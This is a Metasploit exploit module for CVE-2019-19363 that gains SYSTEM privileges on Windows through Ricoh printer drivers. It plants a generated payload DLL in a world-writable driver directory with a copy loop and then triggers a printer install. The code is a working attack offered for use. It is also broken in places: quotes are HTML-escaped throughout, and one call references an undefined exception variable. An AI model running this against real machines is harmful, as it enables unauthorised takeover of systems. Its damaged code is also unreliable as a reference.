# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core/exploit/exe&#039;

class MetasploitModule < Msf::Exploit::Local
  Rank = NormalRanking

  include Msf::Post::File
  include Msf::Exploit::EXE
  include Msf::Post::Windows::Priv
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Ricoh Driver Privilege Escalation&#039;,
      &#039;Description&#039;    => %q(
        Various Ricoh printer drivers allow escalation of
        privileges on Windows systems.

        For vulnerable drivers, a low-privileged user can
        read/write files within the `RICOH_DRV` directory
        and its subdirectories.

        `PrintIsolationHost.exe`, a Windows process running
        as NT AUTHORITY\SYSTEM, loads driver-specific DLLs
        during the installation of a printer. A user can
        elevate to SYSTEM by writing a malicious DLL to
        the vulnerable driver directory and adding a new
        printer with a vulnerable driver.

        This module leverages the `prnmngr.vbs` script
        to add and delete printers. Multiple runs of this
        module may be required given successful exploitation
        is time-sensitive.
      ),
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         => [
                            &#039;Alexander Pudwill&#039;,  # discovery & PoC
                            &#039;Pentagrid AG&#039;,       # PoC
                            &#039;Shelby Pace&#039;         # msf module
                          ],
      &#039;References&#039;     =>
        [
          [ &#039;CVE&#039;, &#039;2019-19363&#039;],
          [ &#039;URL&#039;, &#039;https://www.pentagrid.ch/en/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/&#039;]
        ],
      &#039;Arch&#039;           => [ ARCH_X86, ARCH_X64 ],
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;Payload&#039;        =>
      {
      },
      &#039;Targets&#039;        =>
        [[
            &#039;Windows&#039;, { &#039;Arch&#039;  => [ ARCH_X86, ARCH_X64 ] }
        ]],
      &#039;Notes&#039;          =>
      {
        &#039;SideEffects&#039; =>  [ ARTIFACTS_ON_DISK ],
        &#039;Reliability&#039; =>  [ UNRELIABLE_SESSION ],
        &#039;Stability&#039;   =>  [ SERVICE_RESOURCE_LOSS ]
      },
      &#039;DisclosureDate&#039; => "Jan 22 2020",
      &#039;DefaultTarget&#039;  => 0
    ))

    self.needs_cleanup = true

    register_advanced_options([
      OptBool.new(&#039;ForceExploit&#039;, [ false, &#039;Override check result&#039;, false ])
    ])
  end

  def check
    dir_name = "C:\\ProgramData\\RICOH_DRV"

    return CheckCode::Safe(&#039;No Ricoh driver directory found&#039;) unless directory?(dir_name)
    driver_names = dir(dir_name)

    return CheckCode::Detected("Detected Ricoh driver directory, but no installed drivers") unless driver_names.length

    vulnerable = false
    driver_names.each do |driver_name|
      full_path = "#{dir_name}\\#{driver_name}\\_common\\dlz"
      next unless directory?(full_path)
      @driver_path = full_path

      res = cmd_exec("icacls \"#{@driver_path}\"")
      next unless res.include?(&#039;Everyone:&#039;)
      next unless res.match(/\(F\)/)

      vulnerable = true
      break
    end

    return CheckCode::Detected(&#039;Ricoh driver directory does not have full permissions&#039;) unless vulnerable

    vprint_status("Vulnerable driver directory: #{@driver_path}")
    CheckCode::Appears(&#039;Ricoh driver directory has full permissions&#039;)
  end

  def add_printer(driver_name)
    fail_with(Failure::NotFound, &#039;Printer driver script not found&#039;) unless file?(@script_path)

    dll_data = generate_payload_dll
    dll_path = "#{@driver_path}\\headerfooter.dll"

    temp_path = expand_path(&#039;%TEMP%\\headerfooter.dll&#039;)
    vprint_status("Writing dll to #{temp_path}")

    bat_file_path = expand_path("%TEMP%\\#{Rex::Text.rand_text_alpha(5..9)}.bat")
    cp_cmd = "copy /y \"#{temp_path}\" \"#{dll_path}\""
    bat_file = <<~HEREDOC
      :repeat
      #{cp_cmd} && goto :repeat
    HEREDOC

    write_file(bat_file_path, bat_file)
    write_file(temp_path, dll_data)
    register_files_for_cleanup(bat_file_path, temp_path)

    script_cmd = "cscript \"#{@script_path}\" -a -p \"#{@printer_name}\" -m \"#{driver_name}\" -r \"lpt1:\""
    bat_cmd = "cmd.exe /c \"#{bat_file_path}\""
    print_status("Adding printer #{@printer_name}...")
    client.sys.process.execute(script_cmd, nil, { &#039;Hidden&#039; => true })
    vprint_status("Executing script...")
    cmd_exec(bat_cmd)
    e_log("#{e.class} #{e.message}\n#{e.backtrace * "\n"}")
  end

  def exploit
    fail_with(Failure::None, &#039;Already running as SYSTEM&#039;) if is_system?


    if sysinfo[&#039;Architecture&#039;] != payload.arch.first
      fail_with(Failure::BadConfig, &#039;The payload should use the same architecture as the target driver&#039;)
    end

    @driver_path = &#039;&#039;
    unless check == CheckCode::Appears || datastore[&#039;ForceExploit&#039;]
      fail_with(Failure::NotVulnerable, &#039;Target is not vulnerable. Set ForceExploit to override&#039;)
    end

    @printer_name = Rex::Text.rand_text_alpha(5..9)
    @script_path = "C:\\Windows\\System32\\Printing_Admin_Scripts\\en-US\\prnmngr.vbs"
    drvr_name = @driver_path.split(&#039;\\&#039;)
    drvr_name_idx = drvr_name.index(&#039;RICOH_DRV&#039;) + 1
    drvr_name = drvr_name[drvr_name_idx]

    add_printer(drvr_name)
  end

  def cleanup
    print_status("Deleting printer #{@printer_name}")
    Rex.sleep(3)
    delete_cmd = "cscript \"#{@script_path}\" -d -p \"#{@printer_name}\""
    client.sys.process.execute(delete_cmd, nil, { &#039;Hidden&#039; => true })
  end
end

